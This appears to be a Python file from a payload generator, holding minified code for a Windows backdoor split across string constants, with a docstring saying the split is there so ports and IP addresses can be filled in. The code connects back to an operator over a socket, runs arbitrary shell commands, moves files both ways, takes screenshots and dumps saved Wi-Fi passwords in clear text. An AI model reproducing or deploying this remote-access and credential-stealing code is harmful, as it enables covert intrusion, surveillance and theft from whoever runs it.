
""" The readable code for the payload will be found in the /actual_payload folder. The code here is compressed and minified. This was made to ensure script generation and editing ports and IP addresses goes smoothly."""



payload_split_1: str = """\nW=len\nP='failed'\nO='success'\nN=open\nJ=' '\nI=BaseException\nD=True\nimport subprocess as H,os as F,re,socket as C\nfrom mss import mss\ndef T(cwd,command):\n	A=command\n	if W(A.split(J,1))==2:B=A.split(J,1)[-1];return f"{cwd}\\\\{B.strip()}"\n	else:return f"{cwd}"\ndef U(cwd):B=F.path.normpath(cwd);A=B.split(F.sep);A.pop();return f"{F.sep}".join(A)\ndef V(cwd):\n	try:\n		E='netsh wlan show profile';F='';K=H.run(E,shell=D,text=D,capture_output=D);L=re.findall('(?:Profile\\\\s*:\\\\s)(.*)',K.stdout)\n		for G in L:M=H.run(f"{E} {G} key=clear",shell=D,text=D,capture_output=D);C=re.findall('(?:Key Content\\\\s*:\\\\s)(.*)',M.stdout);C=''.join(C);Q=f"{G} : {C}";F+=f"{Q}\\n"\n		J=N(f"{cwd}\\\\networks_passwords.txt",'w');J.write(F);J.close();A.send(O.encode(B))\n	except I:A.send(P.encode(B))\nG=1024\n""" 


payload_split_3: str = """\nB='utf-8'\nL=K,E\nA=C.socket(C.AF_INET,C.SOCK_STREAM)\nA.connect(L)\ndef M():\n	Z='file header received';Y='filename received';C=F.getcwd()\n	while D:\n		E=A.recv(G).decode(B)\n		if E=='steal networks':V(C)\n		elif E.split(J,1)[0]=='download':\n			K=E.split(J,1)[1].strip()\n			try:\n				Q=N(f"{C}{F.sep}{K}",'rb');A.send('File found'.encode(B));L=Q.read();M=str(W(L)).encode(B);A.send(K.encode(B))\n				if A.recv(G).decode()==Y:\n					A.send(M)\n					if A.recv(G).decode()==Z:A.send(L)\n				Q.close()\n			except I:A.send('File not found'.encode(B))\n		elif E.split(J,1)[0]=='upload':\n			try:K=A.recv(G).decode(B);A.send(Y.encode(B));M=A.recv(G).decode(B);A.send(Z.encode(B));L=A.recv(int(M));R=N(f"{C}{F.sep}{K}",'wb');R.write(L);R.close();A.send(O.encode(B))\n			except I:A.send(P.encode(B))\n		elif E=='snapshot':\n			try:\n				with mss()as X:X.shot(output='snapshot.png')\n				H.run(f'move "{F.getcwd()}{F.sep}snapshot.png" "{C}{F.sep}snapshot.png"',shell=D);A.send(O.encode(B))\n			except I:A.send(P.encode(B))\n		elif E=='cd ..':C=U(C);A.send(C.encode(B))\n		elif'cd'in E:C=T(C,E);A.send(C.encode(B))\n		elif E=='exit':A.close();break\n		else:\n			try:\n				S=H.run(E,text=D,capture_output=D,shell=D,cwd=C)\n				if S.stdout:A.send(S.stdout.encode(B))\n				else:A.send('Command executed.'.encode(B))\n			except I:A.send('Command failed'.encode(B))\nif __name__=='__main__':M()\n"""

